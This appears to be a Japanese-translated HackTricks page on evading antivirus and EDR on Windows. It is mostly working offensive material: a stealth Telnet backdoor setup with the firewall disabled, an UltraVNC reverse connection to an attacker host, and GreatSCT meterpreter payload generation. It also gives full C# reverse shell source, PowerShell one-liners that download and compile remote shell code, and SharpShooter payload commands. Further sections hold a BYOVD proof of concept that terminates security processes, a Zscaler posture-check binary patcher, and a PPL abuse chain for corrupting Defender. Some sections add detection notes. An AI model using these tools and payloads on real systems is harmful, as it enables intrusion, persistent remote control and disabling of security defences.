### **Telnet Server**

Windows10 以前の Windows には、管理者としてインストールできる **Telnet server** が付属していました。例えば次のようにして：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時に**start**するようにして、今すぐ**run**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port**（stealth）を行い、firewall を無効化する:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin ダウンロードを選択してください、setup ではなく)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **新規に** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告:** ステルスを維持するために、次のことを行ってはいけません

- 既に実行中の場合に `winvnc` を起動すると [popup](https://i.imgur.com/1SROTTl.png) が発生するので起動しないでください。`tasklist | findstr winvnc` で実行中か確認してください
- `UltraVNC.ini` が同じディレクトリにない状態で `winvnc` を起動すると [the config window](https://i.imgur.com/rfMQWcf.png) が開いてしまうので起動しないでください
- ヘルプのために `winvnc -h` を実行すると [popup](https://i.imgur.com/oc18wcu.png) が発生するので実行しないでください

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に `msfconsole -r file.rc` で **lister を起動** し、以下で **xml payload** を **実行** します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の Defender はプロセスを非常に速く終了させます。**

### 自前の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
以下と併用してください：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラを使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# の難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/promheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python を使った build injector の例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からの AV/EDR の停止

Storm-2603 は小さなコンソールユーティリティである **Antivirus Terminator** を利用して、ランサムウェアを展開する前にエンドポイント保護を無効化しました。ツールは **独自の脆弱だが*署名済み*のドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) な AV サービスでさえブロックできない特権カーネル操作を発行します。

主なポイント
1. **Signed driver**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、実体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正規署名済みドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目はドライバを **カーネルサービス** として登録し、2 行目はそれを開始して `\\.\ServiceMouse` がユーザランドからアクセス可能になるようにします。
3. **IOCTLs exposed by the driver**
| IOCTL code | 機能                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID による任意プロセスの終了（Defender/EDR サービスを停止するために使用） |
| `0x990000D0` | ディスク上の任意ファイルを削除 |
| `0x990001D0` | ドライバをアンロードしサービスを削除 |

最小限の C による概念実証:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD はユーザモードの保護を完全に回避します。カーネルで実行されるコードは、Protected なプロセスを開いたり終了させたり、PPL/PP、ELAM や他のハードニング機能に関係なくカーネルオブジェクトを改変できます。

検出 / 対策
• Microsoft の脆弱ドライバブロックリスト（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` をロードしないようにする。  
• 新しい *kernel* サービスの作成を監視し、ドライバがワールドライト可能なディレクトリからロードされた場合や許可リストに存在しない場合にアラートを出す。  
• カスタムデバイスオブジェクトへのユーザモードハンドル作成と、その後に続く疑わしい `DeviceIoControl` 呼び出しを監視する。

### On-Disk バイナリパッチによる Zscaler Client Connector のポスチャチェック回避

Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、結果を他のコンポーネントと通信するために Windows RPC を利用します。全回避を可能にする二つの設計上の弱点があります：

1. ポスチャ評価は **完全にクライアント側で実行される**（サーバには boolean が送られるだけ）。  
2. 内部 RPC エンドポイントは接続元実行ファイルが **Zscaler によって署名されている** ことだけを検証する（`WinVerifyTrust` による）。

ディスク上の署名済みバイナリを 4 つパッチすることで、両方のメカニズムを無効化できます：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返し、すべてのチェックが準拠となる |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP 化 ⇒ 任意の（未署名の）プロセスでも RPC パイプにバインド可能 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | トンネルの整合性チェック | 短絡化される |

最小限のパッチャー抜粋:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後:

* **All** posture checks は **green/compliant** と表示されます。
* 署名されていない、または改変されたバイナリが named-pipe RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開くことができます。
* 攻撃されたホストは、Zscaler ポリシーで定義された内部ネットワークに制限なくアクセスできるようになります。

このケーススタディは、純粋にクライアント側の信頼判断と単純な署名チェックが、数バイトのパッチでどのように破られるかを示しています。

## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改ざんする

Protected Process Light (PPL) は署名者/レベルの階層を強制するため、同等かそれ以上の保護レベルのプロセスだけが相互に改ざんできます。攻撃的には、正当に PPL 対応バイナリを起動しその引数を制御できるなら、無害な機能（例: ロギング）を AV/EDR が使用する保護されたディレクトリに対する制約付きの、PPL 支援の書き込みプリミティブに変換できます。

プロセスが PPL として実行される条件
- 対象の EXE（およびロードされる DLLs）は PPL 対応の EKU で署名されている必要があります。
- プロセスは CreateProcess で次のフラグを使って作成される必要があります: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの署名者に一致する互換性のある保護レベルを要求する必要があります（例: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` はアンチマルウェア署名者向け、`PROTECTION_LEVEL_WINDOWS` は Windows 署名者向け）。誤ったレベルだと作成時に失敗します。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャー用ツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数をターゲット EXE に転送します）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用パターン:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- サインされたシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自己生成し、呼び出し元が指定したパスにログファイルを書き込むためのパラメータを受け取る。
- PPLプロセスとして起動された場合、ファイル書き込みはPPLで保護された状態で行われる。
- ClipUpは空白を含むパスを解析できないため、通常保護された場所を指すには8.3短縮パスを使用する。

8.3 short path helpers
- 短縮名を一覧表示: `dir /x` を各親ディレクトリで実行。
- cmdで短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) ランチャー（例: CreateProcessAsPPL）を使って `CREATE_PROTECTED_PROCESS` で PPL対応のLOLBIN（ClipUp）を起動する。
2) ClipUp のログパス引数を渡して、保護されたAVディレクトリ（例: Defender Platform）にファイル作成を強制する。必要なら8.3短縮名を使う。
3) 対象のバイナリが通常実行中にAVによりオープン/ロックされている場合（例: MsMpEng.exe）、AVより先に確実に実行される自動起動サービスをインストールしてブート時に書き込みをスケジュールする。ブート順序は Process Monitor（boot logging）で検証する。
4) 再起動時に、PPLで保護された書き込みがAVがバイナリをロックする前に行われ、対象ファイルが破損して起動不能になる。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事項と制約
- You cannot control the contents ClipUp writes beyond placement; the primitive is suited to corruption rather than precise content injection.
- Requires local admin/SYSTEM to install/start a service and a reboot window.
- タイミングが重要：対象は開かれていてはいけません。起動時に実行することでファイルロックを回避できます。

検出
- 起動時付近において、非標準のランチャによって親付けされるなど、異常な引数で `ClipUp.exe` がプロセス生成される点に注意。
- 疑わしいバイナリを auto-start に設定する新しいサービスや、常に Defender/AV より先に起動するサービス。Defender の起動失敗に先立つサービスの作成/変更を調査すること。
- Defender バイナリや Platform ディレクトリに対するファイル整合性監視；protected-process フラグを持つプロセスによる予期しないファイル作成/変更を確認する。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で生成されたプロセスや、非-AV バイナリによる異常な PPL レベルの使用を監視する。

緩和策
- WDAC/Code Integrity：どの署名済みバイナリが PPL として、どの親プロセスの下で実行可能かを制限する。正当なコンテキスト外での ClipUp の呼び出しをブロックする。
- サービス運用：auto-start サービスの作成/変更を制限し、起動順操作を監視する。
- Defender の tamper protection と early-launch protections が有効になっていることを確認し、バイナリ破損を示す起動エラーを調査する。
- セキュリティツールをホストするボリュームで環境の互換性がある場合、8.3 short-name generation を無効化することを検討する（十分にテストすること）。

PPL とツールの参考
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 参考文献

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
